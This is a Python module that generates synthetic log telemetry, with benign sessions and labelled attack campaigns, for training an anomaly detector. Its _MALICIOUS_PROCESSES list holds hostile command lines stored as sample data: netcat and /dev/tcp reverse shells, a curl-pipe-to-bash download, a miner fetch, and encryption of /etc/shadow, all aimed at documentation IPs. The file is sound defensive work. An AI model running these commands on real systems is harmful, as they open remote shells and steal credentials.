"""Synthetic-but-realistic telemetry generation.

The goal is not "random rows". An anomaly detector trained on uniform noise
learns nothing, so this module models a small enterprise estate and emits
**correlated multi-event scenarios**:

* a stable universe of hosts, users, service accounts and processes;
* a benign baseline whose volume follows a diurnal (business-hours) curve;
* attack campaigns that unfold over several events sharing a ``campaign_id``
  (SSH brute force, reverse shell, C2 beaconing, privilege escalation,
  bulk exfiltration).

Every synthetic anomaly is tagged under ``labels.ground_truth``. That block is
the evaluation label set for Phase 3 and **must be stripped before feature
extraction** — see :data:`GROUND_TRUTH_LABEL` — otherwise the model trivially
cheats by reading the answer off the input.
"""

from __future__ import annotations

import datetime as dt
import ipaddress
import random
import uuid
from collections import deque
from collections.abc import Callable, Iterable
from dataclasses import dataclass

from forensics.ingestion.schemas import (
    EventCategory,
    EventOutcome,
    HostFields,
    LogEvent,
    NetworkFields,
    ProcessFields,
    UserFields,
)

#: Label key holding evaluation ground truth. Strip this in the Spark job.
GROUND_TRUTH_LABEL = "ground_truth"

#: Chance of starting a campaign on a tick that is already under target rate.
#: Only controls *clustering* of attacks, never their overall share — that is
#: governed by ``anomaly_rate``. Lower values give burstier, more realistic
#: campaign spacing.
_CAMPAIGN_ONSET_PROBABILITY = 0.15

# --------------------------------------------------------------------------- #
# Static universe                                                             #
# --------------------------------------------------------------------------- #

_HOST_ROLES: tuple[tuple[str, str], ...] = (
    ("web", "linux"),
    ("api", "linux"),
    ("db", "linux"),
    ("bastion", "linux"),
    ("build", "linux"),
    ("wks", "linux"),
)

_HUMAN_USERS: tuple[str, ...] = (
    "a.sharma", "j.okafor", "m.rossi", "l.chen", "d.novak", "s.patel",
    "r.dubois", "k.tanaka", "e.mwangi", "p.andersson", "n.haddad", "t.olsen",
)

_SERVICE_USERS: tuple[str, ...] = ("svc_backup", "svc_deploy", "svc_metrics", "root")

#: Commands a human runs after logging into a server, in roughly this order.
_INTERACTIVE_COMMANDS: tuple[tuple[str, str, str], ...] = (
    ("bash", "/bin/bash", "-bash"),
    ("ls", "/bin/ls", "ls -la /var/log"),
    ("cat", "/bin/cat", "cat /var/log/syslog"),
    ("grep", "/bin/grep", "grep -i error /var/log/syslog"),
    ("systemctl", "/bin/systemctl", "systemctl status nginx"),
    ("tail", "/usr/bin/tail", "tail -f /var/log/app/worker.log"),
    ("vim", "/usr/bin/vim", "vim /etc/nginx/sites-enabled/default"),
    ("df", "/bin/df", "df -h"),
)

#: The scheduled backup chain, always in the same order.
_CRON_CHAIN: tuple[tuple[str, str, str], ...] = (
    ("cron", "/usr/sbin/cron", "/usr/sbin/cron -f"),
    ("backup.sh", "/usr/local/bin/backup.sh", "/bin/bash /usr/local/bin/backup.sh"),
    ("tar", "/bin/tar", "tar -czf /var/backups/nightly.tar.gz /srv/app"),
    ("rsync", "/usr/bin/rsync", "rsync -az /var/backups/ backup.corp.local:/pool/"),
)

#: Living-off-the-land / tradecraft patterns an analyst would flag on sight.
_MALICIOUS_PROCESSES: tuple[tuple[str, str, str], ...] = (
    ("nc", "/bin/nc", "nc -e /bin/sh 203.0.113.66 4444"),
    ("bash", "/bin/bash", "bash -i >& /dev/tcp/198.51.100.23/9001 0>&1"),
    ("curl", "/usr/bin/curl", "curl -fsSL http://203.0.113.66/p.sh | bash"),
    ("python3", "/usr/bin/python3",
     "python3 -c 'import base64,socket,subprocess,os;s=socket.socket();s.connect((\"203.0.113.66\",4444))'"),
    ("chmod", "/bin/chmod", "chmod +s /tmp/.cache/libx.so"),
    ("wget", "/usr/bin/wget", "wget -q http://198.51.100.23/xmrig -O /tmp/.x && chmod +x /tmp/.x"),
    ("openssl", "/usr/bin/openssl", "openssl enc -aes-256-cbc -in /etc/shadow -out /tmp/.s"),
)

_INTERNAL_NET = ipaddress.ip_network("10.20.0.0/16")


@dataclass(frozen=True, slots=True)
class Host:
    name: str
    ip: str
    os_family: str
    role: str

    def to_fields(self) -> HostFields:
        return HostFields(name=self.name, ip=self.ip, os_family=self.os_family)


@dataclass(frozen=True, slots=True)
class User:
    name: str
    uid: int
    is_service: bool

    def to_fields(self) -> UserFields:
        return UserFields(name=self.name, id=self.uid)


class TelemetryGenerator:
    """Produces a stream of :class:`LogEvent` objects for one simulated estate.

    The generator is deterministic for a given ``seed``, which makes tests
    reproducible and lets a training run be regenerated exactly.
    """

    def __init__(
        self,
        *,
        host_count: int = 12,
        user_count: int = 25,
        anomaly_rate: float = 0.03,
        seed: int | None = None,
        clock: Callable[[], dt.datetime] | None = None,
    ) -> None:
        self._rng = random.Random(seed)
        self._anomaly_rate = anomaly_rate
        self._clock = clock or (lambda: dt.datetime.now(dt.timezone.utc))
        self._hosts = self._build_hosts(host_count)
        self._users = self._build_users(user_count)
        # Events queued by a multi-step campaign, drained before new baseline
        # events are generated so a scenario stays contiguous in the stream.
        self._pending: deque[LogEvent] = deque()
        # Closed-loop counters keeping the *event-level* anomaly fraction on
        # target (see :meth:`_should_start_campaign`).
        self._events_emitted = 0
        self._anomalous_emitted = 0
        self._scenarios: tuple[Callable[[], list[LogEvent]], ...] = (
            self._scenario_ssh_brute_force,
            self._scenario_reverse_shell,
            self._scenario_c2_beaconing,
            self._scenario_privilege_escalation,
            self._scenario_data_exfiltration,
        )
        # Benign sessions and their relative frequency. Web requests dominate a
        # real estate's log volume; package updates are rare.
        self._sessions: tuple[tuple[Callable[[], list[LogEvent]], float], ...] = (
            (self._session_web_request, 0.42),
            (self._session_interactive_ssh, 0.22),
            (self._session_monitoring_heartbeat, 0.18),
            (self._session_cron_backup, 0.12),
            (self._session_package_update, 0.06),
        )

    # -- universe construction ------------------------------------------------

    def _build_hosts(self, count: int) -> list[Host]:
        hosts: list[Host] = []
        for index in range(count):
            role, os_family = _HOST_ROLES[index % len(_HOST_ROLES)]
            hosts.append(
                Host(
                    name=f"{role}-{index // len(_HOST_ROLES) + 1:02d}.corp.local",
                    ip=str(_INTERNAL_NET[10 + index]),
                    os_family=os_family,
                    role=role,
                )
            )
        return hosts

    def _build_users(self, count: int) -> list[User]:
        users: list[User] = [
            User(name=name, uid=0 if name == "root" else 900 + i, is_service=True)
            for i, name in enumerate(_SERVICE_USERS)
        ]
        for index in range(count):
            name = _HUMAN_USERS[index % len(_HUMAN_USERS)]
            suffix = "" if index < len(_HUMAN_USERS) else str(index // len(_HUMAN_USERS) + 1)
            users.append(User(name=f"{name}{suffix}", uid=1000 + index, is_service=False))
        return users

    # -- small helpers --------------------------------------------------------

    def _now(self) -> dt.datetime:
        return self._clock()

    def _timestamp(self, offset_seconds: float = 0.0) -> str:
        return LogEvent.format_timestamp(
            self._now() + dt.timedelta(seconds=offset_seconds)
        )

    def _host(self) -> Host:
        return self._rng.choice(self._hosts)

    def _user(self, *, service: bool | None = None) -> User:
        pool = self._users
        if service is not None:
            pool = [u for u in self._users if u.is_service is service] or self._users
        return self._rng.choice(pool)

    def _rand_hex(self, length: int) -> str:
        """Hex string drawn from the *seeded* RNG.

        ``uuid.uuid4()`` reads from the OS entropy pool and ignores ``seed``,
        which silently destroys reproducibility for anything embedded in a
        message. Ids that must be stable for a given seed come from here;
        ``LogEvent.new_id()`` deliberately stays uuid4 so event ids remain
        globally unique across runs.
        """
        return "".join(self._rng.choice("0123456789abcdef") for _ in range(length))

    def _campaign_id(self) -> str:
        """Deterministic UUID-shaped campaign correlator."""
        return str(uuid.UUID(int=self._rng.getrandbits(128), version=4))

    def _external_ip(self) -> str:
        """Pick from documentation ranges (RFC 5737) so nothing routable leaks."""
        block = self._rng.choice(("203.0.113", "198.51.100", "192.0.2"))
        return f"{block}.{self._rng.randint(1, 254)}"

    def _ephemeral_port(self) -> int:
        return self._rng.randint(32768, 60999)

    def _diurnal_weight(self) -> float:
        """Activity multiplier in [0.15, 1.0] following an office-hours curve.

        Used to decide how "busy" the estate looks; also makes 03:00 root logins
        genuinely rare in the baseline, which is what makes them anomalous.
        """
        hour = self._now().hour
        if 9 <= hour <= 18:
            return 1.0
        if 7 <= hour <= 21:
            return 0.6
        return 0.15

    @staticmethod
    def _ground_truth(scenario: str, campaign_id: str, step: int) -> dict[str, object]:
        return {
            GROUND_TRUTH_LABEL: {
                "is_anomaly": True,
                "scenario": scenario,
                "campaign_id": campaign_id,
                "step": step,
            }
        }

    # -- benign sessions ------------------------------------------------------
    #
    # Real hosts do not emit independent events: a login is followed by a shell,
    # then commands, then a logout; cron runs a fixed chain; a web request
    # triggers a database call. Emitting i.i.d. events instead leaves zero
    # mutual information between consecutive log keys (measured: 0.0009 bits),
    # which makes a *sequence* model meaningless — there is nothing to learn.
    # These sessions supply that structure.

    def _auth_event(
        self,
        host: Host,
        user: User,
        *,
        action: str,
        outcome: EventOutcome,
        message: str,
        severity: int,
        offset: float,
        source_ip: str | None = None,
    ) -> LogEvent:
        return LogEvent(
            event_id=LogEvent.new_id(),
            timestamp=self._timestamp(offset),
            category=EventCategory.AUTHENTICATION,
            action=action,
            outcome=outcome,
            severity=severity,
            message=message,
            host=host.to_fields(),
            dataset="linux.auth",
            user=user.to_fields(),
            network=(
                NetworkFields(
                    source_ip=source_ip,
                    source_port=self._ephemeral_port(),
                    destination_ip=host.ip,
                    destination_port=22,
                    protocol="ssh",
                    transport="tcp",
                    bytes_sent=self._rng.randint(1200, 9000),
                    bytes_received=self._rng.randint(1200, 9000),
                    direction="internal",
                )
                if source_ip
                else None
            ),
        )

    def _exec_event(
        self,
        host: Host,
        user: User,
        spec: tuple[str, str, str],
        *,
        offset: float,
        parent: str,
        severity: int = 6,
    ) -> LogEvent:
        name, executable, command_line = spec
        pid = self._rng.randint(200, 65000)
        return LogEvent(
            event_id=LogEvent.new_id(),
            timestamp=self._timestamp(offset),
            category=EventCategory.PROCESS,
            action="process_started",
            outcome=EventOutcome.SUCCESS,
            severity=severity,
            message=(
                f"audit: type=EXECVE pid={pid} uid={user.uid} comm=\"{name}\" "
                f"exe=\"{executable}\" cmd=\"{command_line}\""
            ),
            host=host.to_fields(),
            dataset="linux.audit",
            user=user.to_fields(),
            process=ProcessFields(
                pid=pid,
                name=name,
                executable=executable,
                command_line=command_line,
                parent_name=parent,
                parent_pid=self._rng.randint(1, 2000),
            ),
        )

    def _flow_event(
        self,
        host: Host,
        *,
        peer_ip: str,
        port: int,
        protocol: str,
        offset: float,
        direction: str,
        sent: int,
        received: int,
        severity: int = 7,
        user: User | None = None,
    ) -> LogEvent:
        return LogEvent(
            event_id=LogEvent.new_id(),
            timestamp=self._timestamp(offset),
            category=EventCategory.NETWORK,
            action="network_flow",
            outcome=EventOutcome.SUCCESS,
            severity=severity,
            message=(
                f"netflow: {host.ip}:{self._ephemeral_port()} -> {peer_ip}:{port} "
                f"proto={protocol} sent={sent} recv={received}"
            ),
            host=host.to_fields(),
            dataset="network.flow",
            user=user.to_fields() if user else None,
            network=NetworkFields(
                source_ip=host.ip,
                source_port=self._ephemeral_port(),
                destination_ip=peer_ip,
                destination_port=port,
                protocol=protocol,
                transport="tcp",
                bytes_sent=sent,
                bytes_received=received,
                direction=direction,
            ),
        )

    def _session_interactive_ssh(self) -> list[LogEvent]:
        """Login → session open → a few commands → session close."""
        host = self._host()
        user = self._user(service=False)
        source_ip = str(_INTERNAL_NET[self._rng.randint(100, 4000)])
        events: list[LogEvent] = []
        offset = 0.0

        # An occasional genuine typo keeps 'failure' from being a perfect
        # predictor of attack on its own.
        for _ in range(self._rng.choice((0, 0, 0, 0, 1))):
            events.append(self._auth_event(
                host, user, action="ssh_login", outcome=EventOutcome.FAILURE,
                severity=5, offset=offset, source_ip=source_ip,
                message=(f"sshd[{self._rng.randint(1000, 60000)}]: Failed password for "
                         f"{user.name} from {source_ip} port {self._ephemeral_port()} ssh2"),
            ))
            offset += self._rng.uniform(1.0, 4.0)

        events.append(self._auth_event(
            host, user, action="ssh_login", outcome=EventOutcome.SUCCESS,
            severity=6, offset=offset, source_ip=source_ip,
            message=(f"sshd[{self._rng.randint(1000, 60000)}]: Accepted publickey for "
                     f"{user.name} from {source_ip} port {self._ephemeral_port()} "
                     f"ssh2: RSA SHA256:{self._rand_hex(16)}"),
        ))
        offset += 0.3
        events.append(self._auth_event(
            host, user, action="session_opened", outcome=EventOutcome.SUCCESS,
            severity=6, offset=offset,
            message=(f"sshd[{self._rng.randint(1000, 60000)}]: "
                     f"pam_unix(sshd:session): session opened for user {user.name} by (uid=0)"),
        ))

        for _ in range(self._rng.randint(2, 7)):
            offset += self._rng.uniform(0.5, 6.0)
            events.append(self._exec_event(
                host, user, self._rng.choice(_INTERACTIVE_COMMANDS),
                offset=offset, parent="sshd",
            ))

        offset += self._rng.uniform(1.0, 10.0)
        events.append(self._auth_event(
            host, user, action="session_closed", outcome=EventOutcome.SUCCESS,
            severity=6, offset=offset,
            message=(f"sshd[{self._rng.randint(1000, 60000)}]: "
                     f"pam_unix(sshd:session): session closed for user {user.name}"),
        ))
        return events

    def _session_cron_backup(self) -> list[LogEvent]:
        """The nightly chain: cron → script → tar → rsync → upload flow."""
        host = self._host()
        user = self._user(service=True)
        events: list[LogEvent] = []
        offset = 0.0
        for spec in _CRON_CHAIN:
            events.append(self._exec_event(
                host, user, spec, offset=offset, parent="cron",
            ))
            offset += self._rng.uniform(0.5, 3.0)

        events.append(self._flow_event(
            host, peer_ip=str(_INTERNAL_NET[7]), port=873, protocol="rsync",
            offset=offset, direction="internal",
            sent=self._rng.randint(5_000_000, 60_000_000),
            received=self._rng.randint(500, 4000), user=user,
        ))
        return events

    def _session_web_request(self) -> list[LogEvent]:
        """Inbound request → app process → outbound database call."""
        host = self._rng.choice(
            [h for h in self._hosts if h.role in ("web", "api")] or self._hosts
        )
        client_ip = str(_INTERNAL_NET[self._rng.randint(100, 4000)])
        db_host = self._rng.choice(
            [h for h in self._hosts if h.role == "db"] or self._hosts
        )
        return [
            self._flow_event(
                host, peer_ip=client_ip, port=443, protocol="https", offset=0.0,
                direction="inbound", sent=self._rng.randint(400, 9000),
                received=self._rng.randint(200, 3000),
            ),
            self._exec_event(
                host, self._user(service=True),
                ("node", "/usr/bin/node", "node /srv/api/server.js"),
                offset=0.05, parent="systemd",
            ),
            self._flow_event(
                host, peer_ip=db_host.ip, port=5432, protocol="postgresql",
                offset=0.12, direction="internal",
                sent=self._rng.randint(200, 2000),
                received=self._rng.randint(500, 90_000),
            ),
        ]

    def _session_package_update(self) -> list[LogEvent]:
        """apt-get followed by repository fetches."""
        host = self._host()
        user = self._user(service=True)
        events = [
            self._exec_event(
                host, user, ("apt-get", "/usr/bin/apt-get", "apt-get -y upgrade"),
                offset=0.0, parent="cron",
            )
        ]
        offset = 1.0
        for _ in range(self._rng.randint(2, 4)):
            events.append(self._flow_event(
                host, peer_ip=self._external_ip(), port=80, protocol="http",
                offset=offset, direction="outbound",
                sent=self._rng.randint(300, 1500),
                received=self._rng.randint(50_000, 4_000_000), user=user,
            ))
            offset += self._rng.uniform(0.5, 2.5)
        return events

    def _session_monitoring_heartbeat(self) -> list[LogEvent]:
        """A *benign* periodic check-in.

        Deliberately included as a hard negative: without it, "regular interval
        plus uniform payload" would be a perfect discriminator for C2 beaconing
        and the detector would be learning an artefact of the simulation rather
        than anything transferable.
        """
        host = self._host()
        user = self._user(service=True)
        collector = str(_INTERNAL_NET[9])
        interval = self._rng.choice((15.0, 30.0, 60.0))
        payload = self._rng.randint(400, 900)
        events: list[LogEvent] = []
        for step in range(self._rng.randint(3, 8)):
            events.append(self._flow_event(
                host, peer_ip=collector, port=9090, protocol="https",
                offset=step * interval + self._rng.uniform(-0.5, 0.5),
                direction="internal",
                sent=payload + self._rng.randint(-15, 15),
                received=self._rng.randint(80, 200), user=user,
            ))
        return events

    # -- attack campaigns -----------------------------------------------------

    def _scenario_ssh_brute_force(self) -> list[LogEvent]:
        """Many failed passwords from one external IP, occasionally breaking in."""
        campaign_id = self._campaign_id()
        host = self._host()
        attacker_ip = self._external_ip()
        target = self._user(service=False)
        attempts = self._rng.randint(12, 40)
        events: list[LogEvent] = []
        for step in range(attempts):
            port = self._ephemeral_port()
            events.append(
                LogEvent(
                    event_id=LogEvent.new_id(),
                    timestamp=self._timestamp(offset_seconds=step * 0.4),
                    category=EventCategory.AUTHENTICATION,
                    action="ssh_login",
                    outcome=EventOutcome.FAILURE,
                    severity=4,
                    message=(
                        f"sshd[{self._rng.randint(1000, 60000)}]: Failed password for "
                        f"{target.name} from {attacker_ip} port {port} ssh2"
                    ),
                    host=host.to_fields(),
                    dataset="linux.auth",
                    user=target.to_fields(),
                    network=NetworkFields(
                        source_ip=attacker_ip,
                        source_port=port,
                        destination_ip=host.ip,
                        destination_port=22,
                        protocol="ssh",
                        transport="tcp",
                        bytes_sent=self._rng.randint(400, 1200),
                        bytes_received=self._rng.randint(200, 600),
                        direction="inbound",
                    ),
                    labels=self._ground_truth("ssh_brute_force", campaign_id, step),
                )
            )
        # One in four campaigns ends in a successful compromise.
        if self._rng.random() < 0.25:
            events.append(
                LogEvent(
                    event_id=LogEvent.new_id(),
                    timestamp=self._timestamp(offset_seconds=attempts * 0.4),
                    category=EventCategory.AUTHENTICATION,
                    action="ssh_login",
                    outcome=EventOutcome.SUCCESS,
                    severity=3,
                    message=(
                        f"sshd[{self._rng.randint(1000, 60000)}]: Accepted password for "
                        f"{target.name} from {attacker_ip} port {self._ephemeral_port()} ssh2"
                    ),
                    host=host.to_fields(),
                    dataset="linux.auth",
                    user=target.to_fields(),
                    labels=self._ground_truth("ssh_brute_force_success", campaign_id, attempts),
                )
            )
        return events

    def _scenario_reverse_shell(self) -> list[LogEvent]:
        """Suspicious exec followed by the outbound socket it opens."""
        campaign_id = self._campaign_id()
        host = self._host()
        user = self._user()
        name, executable, command_line = self._rng.choice(_MALICIOUS_PROCESSES)
        pid = self._rng.randint(200, 65000)
        c2_ip = self._external_ip()
        c2_port = self._rng.choice((4444, 9001, 8080, 1337))
        return [
            LogEvent(
                event_id=LogEvent.new_id(),
                timestamp=self._timestamp(),
                category=EventCategory.PROCESS,
                action="process_started",
                outcome=EventOutcome.SUCCESS,
                severity=2,
                message=(
                    f"audit: type=EXECVE pid={pid} uid={user.uid} comm=\"{name}\" "
                    f"exe=\"{executable}\" cmd=\"{command_line}\""
                ),
                host=host.to_fields(),
                dataset="linux.audit",
                user=user.to_fields(),
                process=ProcessFields(
                    pid=pid,
                    name=name,
                    executable=executable,
                    command_line=command_line,
                    parent_name="sshd",
                    parent_pid=self._rng.randint(1, 2000),
                ),
                labels=self._ground_truth("reverse_shell", campaign_id, 0),
            ),
            LogEvent(
                event_id=LogEvent.new_id(),
                timestamp=self._timestamp(offset_seconds=0.8),
                category=EventCategory.NETWORK,
                action="network_flow",
                outcome=EventOutcome.SUCCESS,
                severity=2,
                message=(
                    f"netflow: {host.ip}:{self._ephemeral_port()} -> {c2_ip}:{c2_port} "
                    f"proto=tcp state=ESTABLISHED"
                ),
                host=host.to_fields(),
                dataset="network.flow",
                user=user.to_fields(),
                network=NetworkFields(
                    source_ip=host.ip,
                    source_port=self._ephemeral_port(),
                    destination_ip=c2_ip,
                    destination_port=c2_port,
                    protocol="unknown",
                    transport="tcp",
                    bytes_sent=self._rng.randint(200, 3000),
                    bytes_received=self._rng.randint(200, 3000),
                    direction="outbound",
                ),
                labels=self._ground_truth("reverse_shell", campaign_id, 1),
            ),
        ]

    def _scenario_c2_beaconing(self) -> list[LogEvent]:
        """Low-variance periodic callbacks — the classic beacon signature."""
        campaign_id = self._campaign_id()
        host = self._host()
        c2_ip = self._external_ip()
        interval = self._rng.choice((30.0, 60.0, 300.0))
        jitter = interval * 0.05  # deliberately tight: periodicity is the tell
        payload = self._rng.randint(900, 1400)
        events: list[LogEvent] = []
        for step in range(self._rng.randint(6, 14)):
            offset = step * interval + self._rng.uniform(-jitter, jitter)
            events.append(
                LogEvent(
                    event_id=LogEvent.new_id(),
                    timestamp=self._timestamp(offset_seconds=offset),
                    category=EventCategory.NETWORK,
                    action="network_flow",
                    outcome=EventOutcome.SUCCESS,
                    severity=3,
                    message=(
                        f"netflow: {host.ip}:{self._ephemeral_port()} -> {c2_ip}:443 "
                        f"proto=https sent={payload} recv={payload // 3} "
                        f"user_agent=\"Mozilla/4.0 (compatible)\""
                    ),
                    host=host.to_fields(),
                    dataset="network.flow",
                    network=NetworkFields(
                        source_ip=host.ip,
                        source_port=self._ephemeral_port(),
                        destination_ip=c2_ip,
                        destination_port=443,
                        protocol="https",
                        transport="tcp",
                        # Near-identical sizes every beat: another strong signal.
                        bytes_sent=payload + self._rng.randint(-20, 20),
                        bytes_received=payload // 3,
                        direction="outbound",
                    ),
                    labels=self._ground_truth("c2_beaconing", campaign_id, step),
                )
            )
        return events

    def _scenario_privilege_escalation(self) -> list[LogEvent]:
        """sudo failures, then a success, then persistence via sudoers."""
        campaign_id = self._campaign_id()
        host = self._host()
        user = self._user(service=False)
        events: list[LogEvent] = []
        for step in range(self._rng.randint(2, 5)):
            events.append(
                LogEvent(
                    event_id=LogEvent.new_id(),
                    timestamp=self._timestamp(offset_seconds=step * 1.5),
                    category=EventCategory.AUTHENTICATION,
                    action="sudo",
                    outcome=EventOutcome.FAILURE,
                    severity=4,
                    message=(
                        f"sudo: {user.name} : {step + 1} incorrect password attempts ; "
                        f"TTY=pts/0 ; PWD=/home/{user.name} ; USER=root ; COMMAND=/bin/bash"
                    ),
                    host=host.to_fields(),
                    dataset="linux.auth",
                    user=user.to_fields(),
                    labels=self._ground_truth("privilege_escalation", campaign_id, step),
                )
            )
        pid = self._rng.randint(200, 65000)
        events.append(
            LogEvent(
                event_id=LogEvent.new_id(),
                timestamp=self._timestamp(offset_seconds=len(events) * 1.5),
                category=EventCategory.PROCESS,
                action="process_started",
                outcome=EventOutcome.SUCCESS,
                severity=2,
                message=(
                    f"audit: type=EXECVE pid={pid} uid=0 comm=\"usermod\" "
                    f"exe=\"/usr/sbin/usermod\" cmd=\"usermod -aG sudo {user.name}\""
                ),
                host=host.to_fields(),
                dataset="linux.audit",
                user=UserFields(name="root", id=0),
                process=ProcessFields(
                    pid=pid,
                    name="usermod",
                    executable="/usr/sbin/usermod",
                    command_line=f"usermod -aG sudo {user.name}",
                    parent_name="sudo",
                    parent_pid=self._rng.randint(1, 2000),
                ),
                labels=self._ground_truth("privilege_escalation", campaign_id, len(events)),
            )
        )
        return events

    def _scenario_data_exfiltration(self) -> list[LogEvent]:
        """A staging archive, then a very large outbound transfer."""
        campaign_id = self._campaign_id()
        host = self._rng.choice([h for h in self._hosts if h.role == "db"] or self._hosts)
        user = self._user()
        pid = self._rng.randint(200, 65000)
        archive = f"/tmp/.stage/{self._rand_hex(8)}.tar.gz"
        exfil_ip = self._external_ip()
        volume = self._rng.randint(80_000_000, 900_000_000)
        return [
            LogEvent(
                event_id=LogEvent.new_id(),
                timestamp=self._timestamp(),
                category=EventCategory.PROCESS,
                action="process_started",
                outcome=EventOutcome.SUCCESS,
                severity=3,
                message=(
                    f"audit: type=EXECVE pid={pid} uid={user.uid} comm=\"tar\" "
                    f"exe=\"/bin/tar\" cmd=\"tar -czf {archive} /var/lib/postgresql/data\""
                ),
                host=host.to_fields(),
                dataset="linux.audit",
                user=user.to_fields(),
                process=ProcessFields(
                    pid=pid,
                    name="tar",
                    executable="/bin/tar",
                    command_line=f"tar -czf {archive} /var/lib/postgresql/data",
                    parent_name="bash",
                    parent_pid=self._rng.randint(1, 2000),
                ),
                labels=self._ground_truth("data_exfiltration", campaign_id, 0),
            ),
            LogEvent(
                event_id=LogEvent.new_id(),
                timestamp=self._timestamp(offset_seconds=12.0),
                category=EventCategory.NETWORK,
                action="network_flow",
                outcome=EventOutcome.SUCCESS,
                severity=1,
                message=(
                    f"netflow: {host.ip}:{self._ephemeral_port()} -> {exfil_ip}:443 "
                    f"proto=https sent={volume} recv=812 duration=418s"
                ),
                host=host.to_fields(),
                dataset="network.flow",
                user=user.to_fields(),
                network=NetworkFields(
                    source_ip=host.ip,
                    source_port=self._ephemeral_port(),
                    destination_ip=exfil_ip,
                    destination_port=443,
                    protocol="https",
                    transport="tcp",
                    bytes_sent=volume,
                    bytes_received=812,
                    direction="outbound",
                ),
                labels=self._ground_truth("data_exfiltration", campaign_id, 1),
            ),
        ]

    # -- public API -----------------------------------------------------------

    def _should_start_campaign(self) -> bool:
        """Decide whether to begin an attack campaign on this tick.

        ``anomaly_rate`` is defined as the target fraction of *events* that are
        malicious — which is what anyone reading the config expects, and what a
        detector's base rate actually means. A naive ``rng.random() <
        anomaly_rate`` per tick would instead be the probability of starting a
        *campaign*, and since one campaign emits 2-40 events that overshoots the
        intended rate by an order of magnitude (0.05 measured as 26% in
        practice).

        So the roll is gated on the ratio observed so far: campaigns only start
        while we are running below target. The random component keeps their
        onset irregular instead of perfectly periodic, and the long-run fraction
        converges to ``anomaly_rate`` from below.
        """
        if self._anomaly_rate <= 0.0:
            return False
        observed = (
            self._anomalous_emitted / self._events_emitted
            if self._events_emitted
            else 0.0
        )
        if observed >= self._anomaly_rate:
            return False
        return self._rng.random() < _CAMPAIGN_ONSET_PROBABILITY

    def next_events(self) -> list[LogEvent]:
        """Return the next slice of the stream (usually one event).

        A campaign is generated in full and buffered, then drained one event per
        call. That keeps the caller's rate limiter authoritative — a burst of 40
        brute-force attempts is paced onto the wire like everything else instead
        of being dumped instantaneously.
        """
        if self._pending:
            return [self._track(self._pending.popleft())]

        if self._should_start_campaign():
            scenario = self._rng.choice(self._scenarios)
            self._pending.extend(scenario())
        else:
            self._pending.extend(self._benign_session())

        return [self._track(self._pending.popleft())]

    def _track(self, event: LogEvent) -> LogEvent:
        """Update the anomaly-ratio counters as each event leaves the generator."""
        self._events_emitted += 1
        if GROUND_TRUTH_LABEL in event.labels:
            self._anomalous_emitted += 1
        return event

    @property
    def observed_anomaly_ratio(self) -> float:
        """Fraction of emitted events carrying a ground-truth anomaly label."""
        if not self._events_emitted:
            return 0.0
        return self._anomalous_emitted / self._events_emitted

    def _benign_session(self) -> list[LogEvent]:
        """Start one correlated benign session.

        Interactive sessions track office hours; machine traffic (web, cron,
        monitoring) is steady around the clock, so the *mix* shifts with time of
        day even though the total does not.
        """
        weight = self._diurnal_weight()
        candidates = []
        for session, share in self._sessions:
            if session is self._session_interactive_ssh:
                share *= weight
            candidates.append((session, share))

        total = sum(share for _, share in candidates)
        roll = self._rng.random() * total
        cumulative = 0.0
        for session, share in candidates:
            cumulative += share
            if roll <= cumulative:
                return session()
        return candidates[-1][0]()

    def stream(self) -> Iterable[LogEvent]:
        """Unbounded iterator over generated events."""
        while True:
            yield from self.next_events()
